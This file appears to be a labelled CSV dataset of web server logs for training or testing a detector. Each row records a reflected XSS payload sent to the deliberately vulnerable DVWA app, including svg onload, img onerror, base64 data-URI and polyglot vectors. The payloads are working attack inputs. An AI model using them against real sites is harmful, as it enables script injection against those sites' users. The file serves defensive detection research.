ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 15:46:05-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%3dx%3aalert(alt)%20onerror%3deval(src)%20alt%3dxss%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1729,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%3dx%3aalert(alt)%20onerror%3deval(src)%20alt%3dxss%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,157,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:05-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3dx%20onerror%3dalert('XSS')%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3dx%20onerror%3dalert('XSS')%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,144,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:05-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3dx%20onerror%3dalert(String%2efromCharCode(88,83,83))%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3dx%20onerror%3dalert(String%2efromCharCode(88,83,83))%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,170,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:06-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,120,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:06-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%2fonload%3dalert('XSS')%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%2fonload%3dalert('XSS')%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,124,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:06-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%2fonload%3dalert(String%2efromCharCode(88,83,83))%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1738,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3csvg%2fonload%3dalert(String%2efromCharCode(88,83,83))%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,150,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20id%3dalert(1)%20onload%3deval(id)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%20id%3dalert(1)%20onload%3deval(id)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,136,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:07-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%2fonload%3dalert(String%2efromCharCode(88,83,83))%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1739,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%2fonload%3dalert(String%2efromCharCode(88,83,83))%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,156,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%2fonload%3dalert(%2fXSS%2f)&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3csvg%2fonload%3dalert(%2fXSS%2f)&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,131,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:08-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onload%3dalert(%2fXSS%2f%2esource)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onload%3dalert(%2fXSS%2f%2esource)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,138,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:08-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cinput%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cinput%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,135,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:08-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cselect%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cselect%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,136,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:09-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ctextarea%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ctextarea%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,138,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:09-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ckeygen%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ckeygen%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,136,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:10-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cvideo%2fposter%2fonerror%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cvideo%2fposter%2fonerror%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,132,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:10-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cvideo%3e%3csource%20onerror%3d%22javascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cvideo%3e%3csource%20onerror%3d%22javascript%3aalert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,154,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:10-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cvideo%20src%3d_%20onloadstart%3d%22alert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cvideo%20src%3d_%20onloadstart%3d%22alert(1)%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,143,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:11-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cdetails%2fopen%2fontoggle%3d%22alert%601%60%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cdetails%2fopen%2fontoggle%3d%22alert%601%60%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,143,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:11-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,133,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:12-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20onstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20onstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,125,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:12-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cMETA%20HTTP-EQUIV%3d%22refresh%22%20CONTENT%3d%220%3burl%3ddata%3atext%2fhtml%3bbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1786,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cMETA%20HTTP-EQUIV%3d%22refresh%22%20CONTENT%3d%220%3burl%3ddata%3atext%2fhtml%3bbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,227,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:13-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3cmeta%2fcontent%3d%220%3burl%3ddata%3atext%2fhtml%3bbase64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg%3d%3d%22http-equiv%3drefresh%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1775,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3cmeta%2fcontent%3d%220%3burl%3ddata%3atext%2fhtml%3bbase64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg%3d%3d%22http-equiv%3drefresh%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,222,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:13-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=data%3atext%2fhtml,%3cscript%3ealert(0)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=data%3atext%2fhtml,%3cscript%3ealert(0)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,145,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:14-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=data%3atext%2fhtml%3bbase64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik%2b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=data%3atext%2fhtml%3bbase64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik%2b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,149,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:14-04:00,GET /DVWA/vulnerabilities/xss_r/?name=jaVasCript%3a%2f%2a-%2f%2a%60%2f%2a%5c%60%2f%2a'%2f%2a%22%2f%2a%2a%2f(%2f%2a%20%2a%2foNcliCk%3dalert()%20)%2f%2f%0D%0A%0D%0A%2f%2f%3c%2fstYle%2f%3c%2ftitLe%2f%3c%2fteXtarEa%2f%3c%2fscRipt%2f--!%3e%5cx3csVg%2f%3csVg%2foNloAd%3dalert()%2f%2f%3e%5cx3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1797,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=jaVasCript%3a%2f%2a-%2f%2a%60%2f%2a%5c%60%2f%2a'%2f%2a%22%2f%2a%2a%2f(%2f%2a%20%2a%2foNcliCk%3dalert()%20)%2f%2f%0D%0A%0D%0A%2f%2f%3c%2fstYle%2f%3c%2ftitLe%2f%3c%2fteXtarEa%2f%3c%2fscRipt%2f--!%3e%5cx3csVg%2f%3csVg%2foNloAd%3dalert()%2f%2f%3e%5cx3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,339,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:46:15-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%20%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1883,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%20%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,639,5,116,XSS
